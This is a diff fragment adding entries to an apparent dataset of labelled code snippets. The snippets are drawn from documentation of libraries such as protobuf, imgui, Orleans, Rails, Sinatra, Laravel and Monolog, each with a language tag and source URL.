+    "code": "{\n\tgit_repository *repo;\n\tconst char *path = \"path/to/repo\";\n\tint error = git_repository_open(&repo, path);\n\n\tif (error < 0) {\n\t\tif (error == GIT_ENOTFOUND)\n\t\t\tfprintf(stderr, \"Could not find repository at path '%s'\\n\", path);\n\t\telse\n\t\t\tfprintf(stderr, \"Unable to open repository: %s\\n\",\n\t\t\t\tgit_error_last()->message);\n\t\texit(1);\n\t}\n\n\t... happy ...\n}",
+    "tag": "c",
+    "source": "https://github.com/libgit2/libgit2/blob/42a89d7cc9374a19e72fa57011e5fe3a99c7b3bf/docs/error-handling.md#L67"
+  },
+  {
+    "label": "c",
+    "code": "#include \"unity.h\"\n#include \"file_to_test.h\"\n\nvoid setUp(void) {\n    // set stuff up here\n}\n\nvoid tearDown(void) {\n    // clean stuff up here\n}\n\nvoid test_function_should_doBlahAndBlah(void) {\n    //test stuff\n}\n\nvoid test_function_should_doAlsoDoBlah(void) {\n    //more test stuff\n}\n\nint main(void) {\n    UNITY_BEGIN();\n    RUN_TEST(test_function_should_doBlahAndBlah);\n    RUN_TEST(test_function_should_doAlsoDoBlah);\n    return UNITY_END();\n}",
+    "tag": "c",
+    "source": "https://github.com/DaveGamble/cJSON/blob/6d9f2443ab071f86e5d9b43025a40929ec41c46c/tests/unity/docs/UnityGettingStartedGuide.md#L123"
+  },
+  {
+    "label": "c",
+    "code": "zend_object *some_global;\n\nvoid GetGlobal(zval *zv) {\n    // We want to create a new ref to an existing object.\n    ZVAL_OBJ_COPY(zv, some_global);\n}",
+    "tag": "c",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/php/REFCOUNTING.md#L70"
+  },
+  {
+    "label": "c",
+    "code": "    char **LoadTextLines(const char *text, int *count); // Load text as separate lines ('\\n')\n    void UnloadTextLines(char **text, int lineCount);   // Unload text lines\n    const char *TextRemoveSpaces(const char *text);     // Remove text spaces, concat words\n    char *GetTextBetween(const char *text, const char *begin, const char *end); // Get text between two strings\n    char *TextReplace(const char *text, const char *search, const char *replacement); // Replace text string with new string\n    char *TextReplaceAlloc(const char *text, const char *search, const char *replacement); // Replace text string with new string, memory must be MemFree()\n    char *TextReplaceBetween(const char *text, const char *begin, const char *end, const char *replacement); // Replace text between two specific strings\n    char *TextReplaceBetweenAlloc(const char *text, const char *begin, const char *end, const char *replacement); // Replace text between two specific strings, memory must be MemFree()\n    char *TextInsertAlloc(const char *text, const char *insert, int position); // Insert text in a defined byte position, memory must be MemFree()",
+    "tag": "c",
+    "source": "https://github.com/raysan5/raylib/blob/48f352c96668369787b47e1bca9f3b78bf2650f1/HISTORY.md#L566"
+  },
+  {
+    "label": "c",
+    "code": "if (dataPtr != NULL)\n{\n    RL_FREE(dataPtr);\n    dataPtr = NULL;\n}",
+    "tag": "c",
+    "source": "https://github.com/raysan5/raylib/blob/48f352c96668369787b47e1bca9f3b78bf2650f1/CONVENTIONS.md#L73"
+  },
+  {
+    "label": "c",
+    "code": "调用接口查询商品数据，productId=-1",
+    "tag": "c",
+    "source": "https://github.com/doocs/advanced-java/blob/80b89fb9496d7ea3213e402c8c3853399e00c363/docs/high-availability/hystrix-circuit-breaker.md#L191"
+  },
+  {
+    "label": "c",
+    "code": "// Tagged pointer - tracked as black arrows in diagrams\nUPB_ATOMIC(uintptr_t) parent_or_count;\n// Linked list - tracked as red arrows in diagrams\nUPB_ATOMIC(struct upb_ArenaInternal*) next;\n// Linked list - previous tracked as blue arrows in diagrams, tail as dashed\nUPB_ATOMIC(uintptr_t) previous_or_tail;",
+    "tag": "c",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/docs/upb/arena_fusion.md#L44"
+  },
+  {
+    "label": "cpp",
+    "code": "bool IterateOverOneofs(const google::protobuf::Descriptor* message) {\n  // Real oneofs are always first, and real_oneof_decl_count() will return the\n  // total number of oneofs, excluding synthetic oneofs.\n  for (int i = 0; i < message->real_oneof_decl_count(); i++) {\n    const google::protobuf::OneofDescriptor* oneof = message->oneof(i);\n    // ...\n  }\n}",
+    "tag": "c++",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/docs/implementing_proto3_presence.md#L292"
+  },
+  {
+    "label": "cpp",
+    "code": "string_t dump(const int indent = -1,\n              const char indent_char = ' ',\n              const bool ensure_ascii = false,\n              const number_format numbers = number_format::shortest) const;",
+    "tag": "cpp",
+    "source": "https://github.com/nlohmann/json/blob/ffcd392be06c871e9a75f7d6b4f4b9c2288bc19c/docs/mkdocs/docs/api/basic_json_view/dump.md#L3"
+  },
+  {
+    "label": "cpp",
+    "code": "// Log patterns can contain custom flags.\n// the following example will add new flag '%*' - which will be bound to a <my_formatter_flag> instance.\n#include \"spdlog/pattern_formatter.h\"\nclass my_formatter_flag : public spdlog::custom_flag_formatter\n{\npublic:\n    void format(const spdlog::details::log_msg &, const std::tm &, spdlog::memory_buf_t &dest) override\n    {\n        std::string some_txt = \"custom-flag\";\n        dest.append(some_txt.data(), some_txt.data() + some_txt.size());\n    }\n\n    std::unique_ptr<custom_flag_formatter> clone() const override\n    {\n        return spdlog::details::make_unique<my_formatter_flag>();\n    }\n};\n\nvoid custom_flags_example()\n{    \n    auto formatter = std::make_unique<spdlog::pattern_formatter>();\n    formatter->add_flag<my_formatter_flag>('*').set_pattern(\"[%n] [%*] [%^%l%$] %v\");\n    spdlog::set_formatter(std::move(formatter));\n}",
+    "tag": "c++",
+    "source": "https://github.com/gabime/spdlog/blob/76d458055b006fd8b86675b67ad51bccc66274c7/README.md#L343"
+  },
+  {
+    "label": "cpp",
+    "code": "struct Size\n{\n  int width;\n  int height;\n\n  Size(int t_width, int t_height) : width(t_width), height(t_height) {}\n};\n\n// This version might make sense for thread safety or something,\n// but more to the point, sometimes we need to hide data, sometimes we don't.\nclass PrivateSize\n{\n  public:\n    int width() const { return m_width; }\n    int height() const { return m_height; }\n    PrivateSize(int t_width, int t_height) : m_width(t_width), m_height(t_height) {}\n\n  private:\n    int m_width;\n    int m_height;\n};",
+    "tag": "cpp",
+    "source": "https://github.com/cpp-best-practices/cppbestpractices/blob/d57b14ec6d7f13f0af65f9bde62aa3ebd5fb588a/03-Style.md#L53"
+  },
+  {
+    "label": "cpp",
+    "code": "PB_TEST(MySuite, StaticConstexprLambdaInConstexpr) {\n  static constexpr auto make_val = [] { return 42; };\n  constexpr int kVal = PB_TEST_CHOOSE_CONSTEXPR((1, make_val()));\n  ...\n}",
+    "tag": "c++",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/src/google/protobuf/testing/protobuf_test.md#L564"
+  },
+  {
+    "label": "cpp",
+    "code": "// Init\nImGuiIO& io = ImGui::GetIO();\nImFont* font1 = io.Fonts->AddFontFromFileTTF(\"font.ttf\",);\nImFont* font2 = io.Fonts->AddFontFromFileTTF(\"anotherfont.otf\");",
+    "tag": "cpp",
+    "source": "https://github.com/ocornut/imgui/blob/4e99c0ab1a28c2b3d1f250ec0266dbf1e455ef58/docs/FONTS.md#L157"
+  },
+  {
+    "label": "cpp",
+    "code": "// C equivalent for upb::Arena::New()\nupb_Arena* upb_Arena_New();",
+    "tag": "c++",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/docs/upb/style-guide.md#L25"
+  },
+  {
+    "label": "cpp",
+    "code": "int partition(vector<int>& arr, int begin, int end) {\n    int left = begin;\n    int right = end;\n    int povit = arr[begin];\n\n    while (left < right) {\n        while (left < right && arr[right] >= povit) {right--;}\n        while (left < right && arr[left] <= povit) {left++;}\n        if (left < right) {swap(arr[left], arr[right]);}\n    }\n\n    swap(arr[begin], arr[left]);\n    return left;\n}\n\nvoid partSort(vector<int>& arr, int begin, int end, int target) {\n    if (begin >= end) {\n        return;\n    }\n\n    int povit = partition(arr, begin, end);\n    if (target < povit) {\n        partSort(arr, begin, povit - 1, target);\n    } else if (target > povit) {\n        partSort(arr, povit + 1, end, target);\n    }\n}\n\nvector<int> getMaxNumbers(vector<int>& arr, int k) {\n    int size = (int)arr.size();\n    // 把求最大的k个数，转换成求最小的size-k个数字\n    int target = size - k;\n    partSort(arr, 0, size - 1, target);\n    vector<int> ret(arr.end() - k, arr.end());\n    return ret;\n}\n\nint main() {\n    vector<int> vec = {4,1,5,8,7,2,3,0,6,9};\n    auto ret = getMaxNumbers(vec, 3);\n\n    for (auto x : ret) {\n        cout << x << endl;    // 输出7，8，9（理论上无序）\n    }\n\n    return 0;\n}",
+    "tag": "cpp",
+    "source": "https://github.com/doocs/advanced-java/blob/80b89fb9496d7ea3213e402c8c3853399e00c363/docs/big-data/topk-problems-and-solutions.md#L54"
+  },
+  {
+    "label": "cpp",
+    "code": "// Better Idea\nconst std::string somevalue = [&](){\n    if (caseA) {\n      return \"Value A\";\n    } else if (caseB) {\n      return \"Value B\";\n    } else {\n      return \"Value C\";\n    }\n  }();",
+    "tag": "cpp",
+    "source": "https://github.com/cpp-best-practices/cppbestpractices/blob/d57b14ec6d7f13f0af65f9bde62aa3ebd5fb588a/08-Considering_Performance.md#L208"
+  },
+  {
+    "label": "cpp",
+    "code": "constexpr dyn_array(size_t n, const T& arg, const Allocator & alloc = Allocator());",
+    "tag": "c++",
+    "source": "https://github.com/isocpp/CppCoreGuidelines/blob/33bcd015997f0d8e0fa0202eb66254a16f59ad8f/docs/dyn_array.md#L44"
+  },
+  {
+    "label": "cpp",
+    "code": "int a[] = { 1, 2, 3};\nspan<int> sa{a};\n\nvector<int> v = { 1, 2, 3 };\nspan<int> sv{v};\n\nassert(sa == sv); // sa and sv both point to contiguous ints with values 1, 2, 3\nassert(sa.data() != sv.data()); // but sa and sv point to different memory areas",
+    "tag": "cpp",
+    "source": "https://github.com/isocpp/CppCoreGuidelines/blob/33bcd015997f0d8e0fa0202eb66254a16f59ad8f/docs/gsl-intro.md#L195"
+  },
+  {
+    "label": "cpp",
+    "code": "// Store a ImTextureID _or_ a ImTextureData*.\nstruct ImTextureRef\n{\n    ImTextureRef()                          { _TexData = nullptr; _TexID = ImTextureID_Invalid; }\n    ImTextureRef(ImTextureID tex_id)        { _TexData = nullptr; _TexID = tex_id; }\n    inline ImTextureID  GetTexID() const    { return _TexData ? _TexData->TexID : _TexID; }\n\n    // Members (either are set, never both!)\n    ImTextureData*      _TexData;           //      A texture, generally owned by a ImFontAtlas. Will convert to ImTextureID during render loop, after texture has been uploaded.\n    ImTextureID         _TexID;             // _OR_ Low-level backend texture identifier, if already uploaded or created by user/app. Generally provided to e.g. ImGui::Image() calls.\n};",
+    "tag": "cpp",
+    "source": "https://github.com/ocornut/imgui/blob/4e99c0ab1a28c2b3d1f250ec0266dbf1e455ef58/docs/FAQ.md#L569"
+  },
+  {
+    "label": "cpp",
+    "code": "class MyTest : public ::testing::Test {\n protected:\n  static void SetUpTestCase() { grpc_init(); }\n  static void TearDownTestCase() { grpc_shutdown(); }\n};\n\nTEST_F(MyTest, TestOne) {\n  ASSERT_DEATH_IF_SUPPORTED(ThisShouldDie(), \"\");\n}\n\nint main(int argc, char** argv) {\ngrpc::testing::TestEnvironment env(&argc, argv);\n  ::testing::InitGoogleTest(&argc, argv);\n  return RUN_ALL_TESTS();\n}",
+    "tag": "c++",
+    "source": "https://github.com/grpc/grpc/blob/aa725a5afd3cea8ec29a86ec7611660943d01d2a/test/cpp/README-iOS.md#L32"
+  },
+  {
+    "label": "csharp",
+    "code": "List<int> xs = new();\nList<int>? ys = new();",
+    "tag": "csharp",
+    "source": "https://github.com/dotnet/docs/blob/22dffe78e3542278c89cf2c2724be8f8272001dd/docs/csharp/language-reference/statements/declarations.md#L56"
+  },
+  {
+    "label": "csharp",
+    "code": "using Orleans;\nusing System.Text.Json.Serialization;\nnamespace ExampleGrains;\n\n// Define a class with System.Text.Json attributes\npublic class MyJsonClass\n{\n    [JsonPropertyName(\"full_name\")]\n    public string Name { get; set; }\n    \n    [JsonPropertyName(\"age\")]\n    public int Age { get; set; }\n    \n    [JsonPropertyName(\"tags\")]\n    public List<string> Tags { get; set; }\n    \n    [JsonIgnore]\n    public string SecretData { get; set; }\n}\n\n// You can use it directly in your grain interfaces and implementation\npublic interface IMyGrain : IGrainWithStringKey\n{\n    Task<MyJsonClass> GetData();\n    Task SetData(MyJsonClass data);\n}\n\npublic class MyGrain : Grain, IMyGrain\n{\n    private MyJsonClass _data;\n\n    public Task<MyJsonClass> GetData()\n    {\n        return Task.FromResult(_data);\n    }\n\n    public Task SetData(MyJsonClass data)\n    {\n        _data = data;\n        return Task.CompletedTask;\n    }\n}",
+    "tag": "csharp",
+    "source": "https://github.com/dotnet/orleans/blob/4e5cf18946f71ba238dfcf621f639c388005d619/src/Orleans.Serialization.SystemTextJson/README.md#L34"
+  },
+  {
+    "label": "csharp",
+    "code": "using Microsoft.Extensions.Hosting;\nusing Orleans.Hosting;\nusing Orleans.Streaming.NATS.Hosting;\n\nvar builder = Host.CreateApplicationBuilder(args)\n    .UseOrleans(siloBuilder =>\n    {\n        siloBuilder\n            .UseLocalhostClustering()\n            // Configure NATS JetStream as a stream provider\n            .AddNatsStreams(\n                \"NatsStreamProvider\",\n                options =>\n                {\n                    options.StreamName = \"orleans-stream\";\n                    // Optional: Configure NATS client options\n                    // options.NatsClientOptions = new NatsOpts { Url = \"nats://localhost:4222\" };\n                    // Optional: Configure batch size (default: 100)\n                    // options.BatchSize = 100;\n                    // Optional: Configure partition count (default: 8)\n                    // options.PartitionCount = 8;\n                });\n    });\n\n// Run the host\nawait builder.RunAsync();",
+    "tag": "csharp",
+    "source": "https://github.com/dotnet/orleans/blob/4e5cf18946f71ba238dfcf621f639c388005d619/src/Orleans.Streaming.NATS/README.md#L15"
+  },
+  {
+    "label": "csharp",
+    "code": "// Previous\nservices.AddAutoMapper(typeof(Program));\n\n// Current\nservices.AddAutoMapper(cfg => cfg.LicenseKey = \"<License Key Here>\", typeof(Program));",
+    "tag": "c#",
+    "source": "https://github.com/AutoMapper/AutoMapper/blob/f0ecba7a97d1403973825fb3cbe2733e6216ff9a/docs/source/15.0-Upgrade-Guide.md#L25"
+  },
+  {
+    "label": "csharp",
+    "code": "var repository = new MongoMessageDataRepository(new MongoUrl(\"mongodb://localhost/masstransitTest\"));",
+    "tag": "csharp",
+    "source": "https://github.com/MassTransit/MassTransit/blob/d9f61f764c802785cc9a4be92547d8f5b63018d4/src/Persistence/MassTransit.MongoDbIntegration/readme.md#L101"
+  },
+  {
+    "label": "csharp",
+    "code": "var configuration = new MapperConfiguration(cfg => cfg.CreateProjection<Customer, CustomerDto>()\n    .ForMember(d => d.FullName, opt => opt.MapFrom(c => c.FirstName + \" \" + c.LastName))\n    .ForMember(d => d.TotalContacts, opt => opt.MapFrom(c => c.Contacts.Count())), loggerFactory);",
+    "tag": "c#",
+    "source": "https://github.com/AutoMapper/AutoMapper/blob/f0ecba7a97d1403973825fb3cbe2733e6216ff9a/docs/source/Queryable-Extensions.md#L107"
+  },
+  {
+    "label": "csharp",
+    "code": "siloBuilder\n    .AddMemoryGrainStorage(\"PubSubStore\")\n    .AddEventHubStreams(\"EventHubStreamProvider\", configurator =>\n    {\n        configurator.ConfigureEventHub(builder => builder.Configure(options =>\n        {\n            options.ConnectionString = \"YOUR_EVENT_HUB_CONNECTION_STRING\";\n            options.ConsumerGroup = \"YOUR_CONSUMER_GROUP\";\n            options.Path = \"YOUR_EVENT_HUB_NAME\";\n        }));\n        configurator.UseGrainCheckpointer(builder => builder.Configure(options =>\n        {\n            options.PersistInterval = TimeSpan.FromSeconds(30);\n        }));\n    });",
+    "tag": "csharp",
+    "source": "https://github.com/dotnet/orleans/blob/4e5cf18946f71ba238dfcf621f639c388005d619/src/Azure/Orleans.Streaming.EventHubs/README.md#L54"
+  },
+  {
+    "label": "csharp",
+    "code": "var services = new ServiceCollection();\nservices.AddResiliencePipeline(\"myFavoriteStrategy\", builder =>\n{\n    builder.AddRetry(new()\n    {\n        OnRetry = args =>\n        {\n            var serviceProvider = services.BuildServiceProvider();\n            var logger = serviceProvider.GetService<ILogger>();\n            // ...\n            return default;\n        }\n    });\n});",
+    "tag": "cs",
+    "source": "https://github.com/App-vNext/Polly/blob/62e7a8c00daf93d361b63d8c9c3f0b0d2e2283a6/docs/advanced/dependency-injection.md#L352"
+  },
+  {
+    "label": "csharp",
+    "code": "var registry = new ExtensionRegistry() \n{ \n    Baz.Extensions.FooExt\n};\nvar foo = Foo.Factory.WithExtensionRegistry(registry).ParseFrom(input);\nAssert.True(foo.HasExtension(Bas.Extensions.FooExt));\nvar fooNoRegistry = Foo.Factory.ParseFrom(input);\nAssert.False(foo.HasExtension(Bas.Extensions.FooExt));",
+    "tag": "cs",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/docs/csharp/proto2.md#L116"
+  },
+  {
+    "label": "csharp",
+    "code": "public class Source\n{\n    public int Value { get; set; }\n    public int Ävíator { get; set; }\n    public int SubAirlinaFlight { get; set; }\n}\npublic class Destination\n{\n    public int Value { get; set; }\n    public int Aviator { get; set; }\n    public int SubAirlineFlight { get; set; }\n}",
+    "tag": "c#",
+    "source": "https://github.com/AutoMapper/AutoMapper/blob/f0ecba7a97d1403973825fb3cbe2733e6216ff9a/docs/source/Configuration.md#L123"
+  },
+  {
+    "label": "csharp",
+    "code": "#!/usr/bin/env dotnet\n#:package Spectre.Console@*\n\nAnsiConsole.MarkupLine(\"[bold green]Hello[/] from a file-based app!\");",
+    "tag": "csharp",
+    "source": "https://github.com/dotnet/docs/blob/22dffe78e3542278c89cf2c2724be8f8272001dd/docs/csharp/fundamentals/program-structure/preprocessor-directives.md#L32"
+  },
+  {
+    "label": "csharp",
+    "code": "// Test for a negative balance.\ntry\n{\n    account.MakeWithdrawal(750, DateTime.Now, \"Attempt to overdraw\");\n}\ncatch (InvalidOperationException e)\n{\n    Console.WriteLine(\"Exception caught trying to overdraw\");\n    Console.WriteLine(e.ToString());\n}",
+    "tag": "csharp",
+    "source": "https://github.com/dotnet/docs/blob/22dffe78e3542278c89cf2c2724be8f8272001dd/docs/csharp/fundamentals/tutorials/classes.md#L174"
+  },
+  {
+    "label": "csharp",
+    "code": "var m = GetProto();\nif (m.Foo != 0) {\n  // \"Clear\" the field:\n  m.Foo = 0;\n} else {\n  // Default value: field may not have been present.\n  m.Foo = 1;\n}",
+    "tag": "c#",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/docs/field_presence.md#L402"
+  },
+  {
+    "label": "ruby",
+    "code": "Date.new(2010, 4, 30).months_ago(2)    # => Sun, 28 Feb 2010\nDate.new(2009, 12, 31).months_since(2) # => Sun, 28 Feb 2010",
+    "tag": "ruby",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/active_support_core_extensions.md#L3367"
+  },
+  {
+    "label": "ruby",
+    "code": "Kernel.exec('irb')",
+    "tag": "ruby",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/ruby/replace-the-current-process-with-an-external-command.md#L12"
+  },
+  {
+    "label": "ruby",
+    "code": "> nil.to_h\n=> {}",
+    "tag": "ruby",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/ruby/turning-things-into-hashes.md#L16"
+  },
+  {
+    "label": "ruby",
+    "code": "template = Liquid::Template.parse(\"{{x | filter1 | upcase}}\")\ntemplate.render({ 'x' => 'foo' }, { strict_filters: true })\n#=> '' # when at least one filter in the filter chain is undefined, a whole expression is rendered as nil\ntemplate.errors\n#=> [#<Liquid::UndefinedFilter: Liquid error: undefined filter filter1>]",
+    "tag": "ruby",
+    "source": "https://github.com/Shopify/liquid/blob/4e39ae4cc3da73921923c0669e0fc84a66b2f696/README.md#L136"
+  },
+  {
+    "label": "ruby",
+    "code": "error do\n  'Sorry there was a nasty error - ' + env['sinatra.error'].message\nend",
+    "tag": "ruby",
+    "source": "https://github.com/sinatra/sinatra/blob/cb22afd7902b566b6eaba6c4ea89739494a65d12/README.md#L2285"
+  },
+  {
+    "label": "ruby",
+    "code": "module Jekyll\n  class UpcaseConverter < Converter\n    safe true\n    priority :low\n\n    def matches(ext)\n      ext =~ /^\\.upcase$/i\n    end\n\n    def output_ext(ext)\n      \".html\"\n    end\n\n    def convert(content)\n      content.upcase\n    end\n  end\nend",
+    "tag": "ruby",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_docs/plugins/converters.md#L22"
+  },
+  {
+    "label": "ruby",
+    "code": "%r!^(?:.+/)*(\\d{4}-\\d{2}-\\d{2})-(.*)(\\.[^.]+)$!",
+    "tag": "ruby",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_posts/2017-03-02-jekyll-3-4-1-released.markdown#L54"
+  },
+  {
+    "label": "ruby",
+    "code": "config.omniauth :github, 'APP_ID', 'APP_SECRET', scope: 'user,public_repo'",
+    "tag": "ruby",
+    "source": "https://github.com/heartcombo/devise/blob/05811fb8366edd08874111d0f6fb44543e1c91ef/README.md#L665"
+  },
+  {
+    "label": "ruby",
+    "code": "m = Msg.new\nif m.has_foo?\n  # Clear the field:\n  m.clear_foo\nelse\n  # Field is not present, so set it.\n  m.foo = 1\nend",
+    "tag": "ruby",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/docs/field_presence.md#L528"
+  },
+  {
+    "label": "ruby",
+    "code": "require 'sinatra'\nrequire 'sinatra/content_for'",
+    "tag": "ruby",
+    "source": "https://github.com/sinatra/sinatra/blob/cb22afd7902b566b6eaba6c4ea89739494a65d12/sinatra-contrib/README.md#L99"
+  },
+  {
+    "label": "ruby",
+    "code": "gem \"jekyll\"",
+    "tag": "ruby",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_docs/step-by-step/01-setup.md#L33"
+  },
+  {
+    "label": "ruby",
+    "code": "# config.ru\nrequire 'rack/protection'\nuse Rack::Protection\nrun MyApp",
+    "tag": "ruby",
+    "source": "https://github.com/sinatra/sinatra/blob/cb22afd7902b566b6eaba6c4ea89739494a65d12/rack-protection/README.md#L10"
+  },
+  {
+    "label": "php",
+    "code": "// Values...\n$value = $user->features()->value('purchase-button');\n$values = $user->features()->values(['new-api', 'purchase-button']);\n\n// State...\n$user->features()->active('new-api');\n$user->features()->allAreActive(['new-api', 'server-api']);\n$user->features()->someAreActive(['new-api', 'server-api']);\n\n$user->features()->inactive('new-api');\n$user->features()->allAreInactive(['new-api', 'server-api']);\n$user->features()->someAreInactive(['new-api', 'server-api']);\n\n// Conditional execution...\n$user->features()->when('new-api',\n    fn () => /* ... */,\n    fn () => /* ... */,\n);\n\n$user->features()->unless('new-api',\n    fn () => /* ... */,\n    fn () => /* ... */,\n);",
+    "tag": "php",
+    "source": "https://github.com/laravel/docs/blob/36fa00db57f97d0a5a89c40be7f50ff8b1133327/pennant.md#L341"
+  },
+  {
+    "label": "php",
+    "code": "app()->make(\\Spatie\\Permission\\PermissionRegistrar::class)->forgetCachedPermissions();",
+    "tag": "php",
+    "source": "https://github.com/spatie/laravel-permission/blob/a8930875b85538b49b50106fa24654586d689fb4/docs/advanced-usage/cache.md#L40"
+  },
+  {
+    "label": "php",
+    "code": "// this will remove other files in the collection\n$yourModel->addMedia($anotherPathToImage)->toMediaCollection('avatar');\n$yourModel->getMedia('avatar')->count(); // returns 1\n$yourModel->getFirstMediaUrl('avatar'); // will return an URL to the `$anotherPathToImage` file",
+    "tag": "php",
+    "source": "https://github.com/spatie/laravel-medialibrary/blob/9feb6a1affb190f726ef5cce1fdfb93267b8a2ca/docs/working-with-media-collections/defining-media-collections.md#L214"
+  },
+  {
+    "label": "php",
+    "code": "// in config/laravel-medialibrary.php\n'image_generators' => [\n    // ...\n    YourImageGenerator::class,\n],",
+    "tag": "php",
+    "source": "https://github.com/spatie/laravel-medialibrary/blob/9feb6a1affb190f726ef5cce1fdfb93267b8a2ca/docs/converting-other-file-types/creating-a-custom-image-generator.md#L60"
+  },
+  {
+    "label": "php",
+    "code": "namespace Spatie\\MediaLibrary\\Support\\PathGenerator;\n\nuse Spatie\\MediaLibrary\\MediaCollections\\Models\\Media;\n\ninterface PathGenerator\n{\n    /*\n     * Get the path for the given media, relative to the root storage path.\n     */\n    public function getPath(Media $media): string;\n\n    /*\n     * Get the path for conversions of the given media, relative to the root storage path.\n     */\n    public function getPathForConversions(Media $media): string;\n\n    /*\n     * Get the path for responsive images of the given media, relative to the root storage path.\n     */\n    public function getPathForResponsiveImages(Media $media): string;\n}",
+    "tag": "php",
+    "source": "https://github.com/spatie/laravel-medialibrary/blob/9feb6a1affb190f726ef5cce1fdfb93267b8a2ca/docs/advanced-usage/using-a-custom-directory-structure.md#L31"
+  },
+  {
+    "label": "php",
+    "code": "\\Composer\\InstalledVersions::getInstalledPackagesByType('foo-plugin');",
+    "tag": "php",
+    "source": "https://github.com/composer/composer/blob/fac7d53f689dee6254f110f3b0104dfa39e607a9/doc/07-runtime.md#L127"
+  },
+  {
+    "label": "php",
+    "code": "@hasexactroles('writer|admin')\n    I am both a writer and an admin and nothing else!\n@else\n    I do not have all of these roles or have more other roles...\n@endhasexactroles",
+    "tag": "php",
+    "source": "https://github.com/spatie/laravel-permission/blob/a8930875b85538b49b50106fa24654586d689fb4/docs/basic-usage/blade-directives.md#L112"
+  },
+  {
+    "label": "php",
+    "code": "<?php\n\nuse Monolog\\Logger;\nuse Symfony\\Component\\Clock\\MockClock;\n\n$clock = new MockClock('2024-03-05 11:22:33');\n$logger = new Logger('my_logger', [$handler], [], null, $clock);\n\n// or on an existing logger, pass null to go back to reading the current time\n$logger->setClock($clock);",
+    "tag": "php",
+    "source": "https://github.com/Seldaek/monolog/blob/3bed304b1905fed5c30d172872f4d890cbb03c6a/doc/01-usage.md#L128"
+  },
+  {
+    "label": "php",
+    "code": "$role->syncPermissions($permissions);\n$permission->syncRoles($roles);",
+    "tag": "php",
+    "source": "https://github.com/spatie/laravel-permission/blob/a8930875b85538b49b50106fa24654586d689fb4/docs/basic-usage/basic-usage.md#L44"
+  },
+  {
+    "label": "php",
+    "code": "<?php\n\nnamespace My\\Composer;\n\nuse Composer\\Plugin\\Capability\\CommandProvider as CommandProviderCapability;\nuse Symfony\\Component\\Console\\Input\\InputInterface;\nuse Symfony\\Component\\Console\\Output\\OutputInterface;\nuse Composer\\Command\\BaseCommand;\n\nclass CommandProvider implements CommandProviderCapability\n{\n    public function getCommands()\n    {\n        return [new Command];\n    }\n}\n\nclass Command extends BaseCommand\n{\n    protected function configure(): void\n    {\n        $this->setName('custom-plugin-command');\n    }\n\n    protected function execute(InputInterface $input, OutputInterface $output): int\n    {\n        $output->writeln('Executing');\n\n        return 0;\n    }\n}",
+    "tag": "php",
+    "source": "https://github.com/composer/composer/blob/fac7d53f689dee6254f110f3b0104dfa39e607a9/doc/articles/plugins.md#L246"
+  },
+  {
+    "label": "php",
+    "code": "<?php\n\nuse Monolog\\Level;\nuse Monolog\\Logger;\nuse Monolog\\LogRecord;\nuse Monolog\\Handler\\AbstractProcessingHandler;\n\nclass PDOHandler extends AbstractProcessingHandler\n{\n    private bool $initialized = false;\n    private PDO $pdo;\n    private PDOStatement $statement;\n\n    public function __construct(PDO $pdo, int|string|Level $level = Level::Debug, bool $bubble = true)\n    {\n        $this->pdo = $pdo;\n        parent::__construct($level, $bubble);\n    }\n\n    protected function write(LogRecord $record): void\n    {\n        if (!$this->initialized) {\n            $this->initialize();\n        }\n\n        $this->statement->execute(array(\n            'channel' => $record->channel,\n            'level' => $record->level,\n            'message' => $record->formatted,\n            'time' => $record->datetime->format('U'),\n        ));\n    }\n\n    private function initialize()\n    {\n        $this->pdo->exec(\n            'CREATE TABLE IF NOT EXISTS monolog '\n            .'(channel VARCHAR(255), level INTEGER, message LONGTEXT, time INTEGER UNSIGNED)'\n        );\n        $this->statement = $this->pdo->prepare(\n            'INSERT INTO monolog (channel, level, message, time) VALUES (:channel, :level, :message, :time)'\n        );\n\n        $this->initialized = true;\n    }\n}",
+    "tag": "php",
+    "source": "https://github.com/Seldaek/monolog/blob/3bed304b1905fed5c30d172872f4d890cbb03c6a/doc/04-extending.md#L21"
+  },
+  {
+    "label": "php",
+    "code": "<?php\n\nuse Monolog\\Logger;\nuse Monolog\\Handler\\SocketHandler;\n\n// Create the logger\n$logger = new Logger('my_logger');\n\n// Create the handler\n$handler = new SocketHandler('unix:///var/log/httpd_app_log.socket');\n$handler->setPersistent(true);\n\n// Now add the handler\n$logger->pushHandler($handler, Level::Debug);\n\n// You can now use your logger\n$logger->info('My logger is now ready');",
+    "tag": "php",
+    "source": "https://github.com/Seldaek/monolog/blob/3bed304b1905fed5c30d172872f4d890cbb03c6a/doc/sockets.md#L15"
+  },
+  {
+    "label": "php",
+    "code": "<?php\n\ninclude $_composer_autoload_path ?? __DIR__ . '/../vendor/autoload.php';",
+    "tag": "php",
+    "source": "https://github.com/composer/composer/blob/fac7d53f689dee6254f110f3b0104dfa39e607a9/doc/articles/vendor-binaries.md#L91"
+  },
+  {
+    "label": "yaml",
+    "code": "local:\n  service: Disk\n  root: <%= Rails.root.join(\"storage\") %>",
+    "tag": "yaml",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/active_storage_overview.md#L1215"
+  },
+  {
